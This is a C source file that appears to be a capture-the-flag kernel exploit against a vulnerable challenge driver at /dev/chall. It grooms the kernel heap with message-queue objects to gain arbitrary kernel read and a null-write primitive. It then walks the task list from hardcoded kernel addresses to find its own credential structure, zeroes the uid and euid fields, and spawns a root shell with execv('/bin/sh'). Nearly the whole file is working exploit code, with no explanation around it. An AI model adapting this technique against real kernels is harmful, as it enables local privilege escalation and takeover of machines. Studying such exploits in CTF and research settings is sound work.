#include <linux/fs.h> 
#include <sys/ioctl.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdbool.h>
#include <sys/types.h>
#include <sys/ioctl.h>

#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#define CHALLENGE_DRIVER "/dev/chall"

#define CMD_ALLOC 1337
#define CMD_DELETE 1338
#define CMD_READ 1339
#define CMD_INFO 1340
#define CMD_TOGGLE 1341
#define MAX_BUFSIZE 1024

const bool DEBUG = false;


typedef union request {

    struct alloc {
        unsigned long idx;
        char* buf;
        unsigned long bufsize;
        unsigned int public;
    } alloc;

    struct delete {
        unsigned long idx;
    } delete;

    struct read {
        unsigned long idx;
        char *buf;
        unsigned long bufsize;
    } read;

    struct info {
        unsigned long idx;
        unsigned long bufsize;
        unsigned int public;
        uid_t owner_uid;
    } info;

    struct toggle {
        unsigned long idx;
    } toggle;

} request_t;

typedef struct recipe {
    char *buf;
    unsigned long bufsize;
    unsigned int public;
    uid_t owner_uid;
} recipe_t;



static int fd;
int alloc(unsigned long idx, char* buf, unsigned long bufsize, unsigned int public)
{
    struct alloc req ={
        .idx=idx,
        .buf=buf,
        .bufsize=bufsize,
        .public=public
    };
    ioctl(fd,CMD_ALLOC,&req);
    if (DEBUG){
        printf("Created\n");
        printf("Info about index %ld\n",req.idx);
        printf("\tBuf: %s\n",req.buf);
        printf("\tBUfSize: %lu\n",req.bufsize);
        printf("\tPublic: %d\n",req.public);
    }
    return 0;
}
struct info info(unsigned long idx)
{
    struct info req = {
        .idx=idx
    };
    ioctl(fd,CMD_INFO,&req);
    if (DEBUG){
        printf("Info about index %ld\n",idx);
        printf("\tBuf Size: %ld\n",req.bufsize);
        printf("\tPublic: %d\n",req.public);
        printf("\tOwner: %d\n",req.owner_uid);
    }
    return req;
}
int delete(unsigned long idx)
{
    struct delete req = {
        .idx=idx
    };
    ioctl(fd,CMD_DELETE,&req);
    if (DEBUG){
        printf("Index %ld deleted!\n",idx);
    }
    return 0;
}
int _read(unsigned long idx,unsigned long bufsize)
{
    char* ret_buf=malloc(bufsize);
    struct read req = {
        .idx=idx,
        .buf=ret_buf,
        .bufsize=bufsize
    };
    ioctl(fd,CMD_READ,&req);
    write(1,ret_buf,bufsize);
    if (DEBUG){
        printf("Index %ld:\n",idx);
        puts("");
    }
    return 0;
}
int toggle(unsigned long idx)
{
    struct toggle req = {
        .idx=idx
    };
    if(DEBUG){
        printf("Toggling %ld!\n",idx);
    }
    ioctl(fd,CMD_TOGGLE,&req);
    return 0;
}

struct msgbuf {
    long mtype;       /* message type, must be > 0 */
    char mtext[2040-48];    /* message data */
};

unsigned long long arb_read(unsigned long long addr ){
    struct msgbuf m;
    struct info leaks;
    struct msgbuf o;
    unsigned long long add = addr;

    m.mtype = 1;
    memset(m.mtext,0,sizeof(m.mtext));
    unsigned long *ptr = (unsigned long *) m.mtext;
    // SUB 8 for readable offets
    ptr[0] = addr - 8;


    int msqid = msgget(IPC_PRIVATE,IPC_CREAT);

    int ret_val = msgsnd(msqid, &m, sizeof(m.mtext), IPC_NOWAIT);
    if (DEBUG){
        printf("Msgget Create: %d\n", msqid);
        printf("MSgsng: %d\n", ret_val);
    }

    unsigned long long heap_leak = leaks.bufsize;
    leaks = info(6);
    // Frees the buffer
    msgrcv(msqid,&o,sizeof(m.mtext), 0, IPC_NOWAIT);

    return leaks.bufsize;
}

bool null_write(unsigned long long addr ){
    struct msgbuf m;
    struct info leaks;
    struct msgbuf o;
    unsigned long long add = addr;

    m.mtype = 1;
    memset(m.mtext,0,sizeof(m.mtext));
    unsigned long *ptr = (unsigned long *) m.mtext;
    // Toggle offset is at reciple + 16
    ptr[0] = addr - 16;


    int msqid = msgget(IPC_PRIVATE,IPC_CREAT);

    int ret_val = msgsnd(msqid, &m, sizeof(m.mtext), IPC_NOWAIT);
    if (DEBUG){
        printf("Msgget Create: %d\n", msqid);
        printf("MSgsng: %d\n", ret_val);
    }

    unsigned long long heap_leak = leaks.bufsize;
    puts("TOGGLE");
    /* gets(o); */

    printf("UID:%d\tPID:%d\tEUID:%d\n",geteuid(), getpid(), geteuid());
    toggle(6);
    // Frees the buffer
    msgrcv(msqid,&o,sizeof(m.mtext), 0, IPC_NOWAIT);
    printf("UID:%d\tPID:%d\tEUID:%d\n",geteuid(), getpid(), geteuid());

    return 0;
}




#define cred_off 0x728
#define next_task 0x458 
#define pid_off 0x560 
int main (int argc, char *argv[])
{
    recipe_t recipe;
    request_t request;
    struct msgbuf m;
    struct info leaks;
    struct msgbuf o;

    fd = open("/dev/chall", O_RDWR);

    for ( int i =0; i < 0xff; i ++){
        alloc(i, "A", 20,10);
    }

    if (DEBUG){
        puts("FREEEEE");
    }
    /* gets(recipe); */
    // FREEEEEE
    alloc(0xff, "A", 20,10);

    unsigned long long init_task = 0xffffffff828149c0;
    unsigned long long curr= init_task;
    unsigned long long modprobe = 0xffffffff828510a0;
    int our_pid = getpid();

    while (1){
        unsigned long cred = arb_read(curr +cred_off);
        printf("CRED STRUCT AT: 0x%lx\n", cred);
        int pid = arb_read(curr + pid_off) &0xffffffff;
        printf("\tUUID: 0x%llx\tPID: 0x%x\n", arb_read(cred+4),pid);
        if (our_pid == pid){
            puts("FOUND PID");
            // Must Overwrite euid before uid?????
            null_write(cred + 20);
            null_write(cred + 4);
            break;
        }

        curr = arb_read(curr + next_task) -next_task;
        }

    char * a[] = {"/bin/sh",NULL};
    execv("/bin/sh", a);
    puts("DONT SEE");

    return 0;
}
